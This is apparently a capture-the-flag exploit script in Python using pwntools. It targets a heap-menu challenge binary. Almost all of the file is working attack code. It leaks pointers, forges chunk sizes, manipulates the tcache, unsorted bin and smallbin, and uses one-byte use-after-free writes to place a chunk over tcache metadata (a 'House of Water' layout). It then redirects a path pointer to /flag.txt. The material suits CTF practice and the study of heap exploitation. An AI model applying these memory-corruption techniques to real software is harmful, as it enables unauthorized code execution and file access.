#!/usr/bin/env python3
from pathlib import Path
from pwn import *

context.arch = "amd64"
context.os = "linux"
context.log_level = args.LOG or "info"

HOST = args.HOST or "127.0.0.1"
PORT = int(args.PORT or 31337)
ROOT = Path(__file__).resolve().parents[1]


def local_binary_path():
    if args.BINARY:
        return Path(args.BINARY)
    for candidate in (ROOT / "src" / "chall", ROOT / "dist" / "chall", Path("./chall"), Path("/home/ctf/chall")):
        if candidate.exists() and os.access(candidate, os.X_OK):
            return candidate
    raise SystemExit("No local binary found. Use REMOTE, run `make -C ../src`, or pass BINARY=./chall.")


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([str(local_binary_path())])


def create(io, idx, size):
    io.sendlineafter(b"kaela> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())


def edit(io, idx, data):
    io.sendlineafter(b"kaela> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"length: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)


def view(io, idx):
    io.sendlineafter(b"kaela> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.recvuntil(b"BEGIN-DATA\n")
    return io.recvuntil(b"\nEND-DATA", drop=True)


def delete(io, idx):
    io.sendlineafter(b"kaela> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())


def calibrate(io, idx, off, data):
    io.sendlineafter(b"kaela> ", b"5")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"offset: ", str(off).encode())
    io.sendlineafter(b"length: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)


def peel(io, idx):
    io.sendlineafter(b"kaela> ", b"6")
    io.sendlineafter(b"index: ", str(idx).encode())


def rinse(io, idx, off):
    io.sendlineafter(b"kaela> ", b"7")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"offset: ", str(off).encode())


def submit(io):
    io.sendlineafter(b"kaela> ", b"8")
    return io.recvuntil(b"[ end ticket ]", timeout=3)


def main():
    io = start()

    # Required PIE/data leak. Slot 0 is a seeded note containing pointers.
    leak = view(io, 0)
    sample_path = u64(leak[:8])
    notes = u64(leak[8:16])
    log.info("sample_path = %#x", sample_path)
    log.info("notes       = %#x", notes)

    # House of Water layout: three 0x90 ore chunks separated by guards.
    create(io, 1, 0x88)  # relative chunk: must stay in heap 0x2xx area
    create(io, 2, 0x18)  # guard
    create(io, 3, 0x88)  # small_start
    create(io, 4, 0x18)  # guard
    create(io, 5, 0x88)  # small_end
    create(io, 6, 0x18)  # guard after small_end/top

    # Write fake size fields and free ptr-0x10 into the 0x330 and 0x320 tcache bins.
    calibrate(io, 3, -0x18, p64(0x331))
    peel(io, 3)
    calibrate(io, 3, -0x8, p64(0x91))

    calibrate(io, 5, -0x18, p64(0x321))
    peel(io, 5)
    calibrate(io, 5, -0x8, p64(0x91))

    # Fill the real 0x90 tcache so target chunks go to the unsorted bin.
    for i in range(7, 14):
        create(io, i, 0x88)
    for i in range(7, 14):
        delete(io, i)

    # Free into unsorted in the order needed for the smallbin chain.
    delete(io, 5)
    delete(io, 1)
    delete(io, 3)

    # Force unsorted chunks into the 0x90 smallbin.
    create(io, 14, 0x700)

    # One-byte UAF NUL writes redirect the smallbin chain to heap_base+0x200.
    rinse(io, 3, 0)
    rinse(io, 5, 8)

    # Drain 0x90 tcache, then allocate small_start, small_end, and the fake chunk
    # overlapping tcache_perthread_struct metadata.
    for i in range(15, 22):
        create(io, i, 0x88)
    create(io, 22, 0x88)
    create(io, 23, 0x88)
    create(io, 24, 0x88)

    # The remaining 0x320 tcache count makes malloc(0x318) return sample_path.
    edit(io, 24, p64(sample_path))
    create(io, 25, 0x318)
    edit(io, 25, b"/flag.txt\x00")

    out = submit(io)
    print(out.decode(errors="replace"))
    io.close()


if __name__ == "__main__":
    main()
